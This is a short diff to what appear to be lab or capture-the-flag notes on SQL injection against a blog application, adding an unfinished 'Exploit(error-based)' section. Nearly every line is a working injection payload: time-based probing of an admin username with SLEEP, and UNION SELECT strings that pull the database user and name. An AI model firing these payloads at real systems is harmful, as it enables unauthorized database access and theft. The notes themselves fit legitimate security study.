@@ -19,3 +19,13 @@
 2. Time-based: `' OR IF(SUBSTRING((SELECT username FROM users WHERE username = 'blogpage_admin'), 1, 1) = 'b', SLEEP(1), 0) %23`
 
 3. Error-based: `' union select null, null, null, null, null %23`
+
+# Exploit(error-based)
+
+1. Retrieve user: `' UNION SELECT NULL, user(), NULL, NULL, NULL %23`
+
+2. Retrieve database name: `' UNION SELECT NULL, database(), NULL, NULL, NULL %23`
+
+3. 
+
+
